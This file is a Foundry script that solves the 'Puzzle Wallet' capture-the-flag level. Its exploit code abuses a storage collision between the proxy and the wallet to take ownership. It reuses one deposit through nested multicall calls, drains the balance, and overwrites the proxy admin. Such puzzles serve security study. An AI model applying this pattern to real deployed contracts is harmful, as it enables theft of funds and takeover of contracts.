// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {PuzzleProxy, PuzzleWallet} from "../instances/Ilevel24.sol";

contract Attacker is Script {
    PuzzleProxy proxy = PuzzleProxy(0xc525D9c0204ef2909d9C725ad7f5AF7cEe9a66f1);
    PuzzleWallet wallet = PuzzleWallet(0xc525D9c0204ef2909d9C725ad7f5AF7cEe9a66f1);

    address player = 0xE58EB5D607D62AdDf5F16e3750FB56adD6771917;

    function run() external {
        vm.startBroadcast();

        proxy.proposeNewAdmin(player);
        wallet.addToWhitelist(player);

        bytes[] memory deposit = new bytes[](1);
        deposit[0] = abi.encodeCall(wallet.deposit, ());

        bytes[] memory multiMulticall = new bytes[](2);
        multiMulticall[0] = abi.encodeCall(wallet.multicall, (deposit));
        multiMulticall[1] = abi.encodeCall(wallet.multicall, (deposit));

        wallet.multicall{value: 0.001 ether}(multiMulticall);
        wallet.execute(player, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(player)));

        vm.stopBroadcast();
    }
}
